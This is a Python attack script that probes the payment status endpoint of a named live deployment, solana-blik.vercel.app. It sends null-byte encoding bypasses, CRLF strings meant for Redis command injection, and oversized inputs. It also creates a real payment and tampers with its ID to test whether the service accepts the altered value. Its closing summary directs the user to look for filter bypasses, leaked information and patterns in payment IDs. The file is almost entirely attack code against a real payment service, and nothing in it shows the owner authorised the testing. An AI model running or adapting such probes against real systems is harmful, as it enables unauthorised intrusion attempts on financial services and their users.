import requests
import json
from urllib.parse import quote

BASE_URL = "https://solana-blik.vercel.app"

def test_payload(payload_name, payload, description=""):
    """Test a single payload against the status endpoint"""
    url = f"{BASE_URL}/api/payments/{payload}/status"
    
    print(f"\n{"="*80}")
    print(f"Test: {payload_name}")
    print(f"Payload: {repr(payload)}")
    if description:
        print(f"Description: {description}")
    print(f"URL: {url}")
    
    try:
        response = requests.get(url, timeout=10)
        print(f"Status Code: {response.status_code}")
        print(f"Content-Type: {response.headers.get("content-type", "N/A")}")
        
        # Try to parse as JSON
        try:
            json_response = response.json()
            print(f"Response: {json.dumps(json_response, indent=2)[:500]}")
        except:
            # If not JSON, show raw text
            print(f"Response (text): {response.text[:500]}")
            
        return response
    except Exception as e:
        print(f"Error: {str(e)}")
        return None

def create_payment():
    """Try to create a real payment and get a valid payment ID"""
    url = f"{BASE_URL}/api/payments/create"
    
    print(f"\n{"="*80}")
    print(f"Creating Test Payment")
    print(f"URL: {url}")
    
    payload = {
        "amount": 0.01,
        "merchantWallet": "11111111111111111111111111111111"
    }
    
    print(f"Payload: {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        print(f"Status Code: {response.status_code}")
        print(f"Content-Type: {response.headers.get("content-type", "N/A")}")
        
        try:
            json_response = response.json()
            print(f"Response: {json.dumps(json_response, indent=2)}")
            return json_response.get("paymentId")
        except:
            print(f"Response (text): {response.text}")
            return None
    except Exception as e:
        print(f"Error: {str(e)}")
        return None

def main():
    print("="*80)
    print("ENCODING BYPASS TESTING - Payment Status Endpoint")
    print("="*80)
    
    # Test 1: Valid UUID format (baseline)
    test_payload(
        "Valid UUID",
        "550e8400-e29b-41d4-a716-446655440000",
        "Baseline test with valid UUID format"
    )
    
    # Test 2: Double URL encoding (null byte)
    test_payload(
        "Double URL Encoded Null",
        "test%2500",
        "Attempting to bypass filters with double-encoded null byte"
    )
    
    # Test 3: Unicode null byte
    test_payload(
        "Unicode Null",
        "test\\u0000",
        "Unicode representation of null byte"
    )
    
    # Test 4: Case variation
    test_payload(
        "Case Variation",
        "PAYMENT:TEST",
        "Testing case sensitivity in validation"
    )
    
    # Test 5: Length boundary
    long_payload = "A" * 500
    test_payload(
        "Length Boundary",
        long_payload,
        f"Testing with very long string ({len(long_payload)} chars)"
    )
    
    # Test 6: Redis CRLF injection
    test_payload(
        "CRLF Injection",
        "test\\r\\nGET",
        "Attempting Redis command injection via CRLF"
    )
    
    # Additional encoding tests
    test_payload(
        "Raw Null Byte Attempt",
        "test\x00bypass",
        "Direct null byte in string"
    )
    
    test_payload(
        "URL Encoded Null",
        "test%00bypass",
        "Single URL-encoded null byte"
    )
    
    test_payload(
        "Hex Encoded",
        "test\\x00bypass",
        "Hex escape sequence"
    )
    
    # Test creating a real payment
    print(f"\n{"="*80}")
    print("ATTEMPTING TO CREATE REAL PAYMENT")
    print("="*80)
    
    payment_id = create_payment()
    
    if payment_id:
        print(f"\n{"="*80}")
        print(f"Testing with Valid Payment ID: {payment_id}")
        print("="*80)
        
        test_payload(
            "Valid Payment ID",
            payment_id,
            "Testing status check with legitimate payment ID"
        )
        
        # Test manipulation of valid payment ID
        if len(payment_id) > 5:
            test_payload(
                "Modified Payment ID",
                payment_id[:-1] + "X",
                "Testing with slightly modified valid payment ID"
            )
    
    print(f"\n{"="*80}")
    print("TESTING COMPLETE")
    print("="*80)
    print("\nSummary:")
    print("- Tested various encoding bypass techniques")
    print("- Attempted null byte injection via multiple encodings")
    print("- Tested CRLF injection for Redis command injection")
    print("- Tested case variations and length boundaries")
    print("- Attempted to create and test with valid payment IDs")
    print("\nAnalyze responses above for:")
    print("  1. Differences in error handling")
    print("  2. Any successful bypasses of null byte filter")
    print("  3. Information disclosure in error messages")
    print("  4. Patterns in valid payment ID structure")

if __name__ == "__main__":
    main()
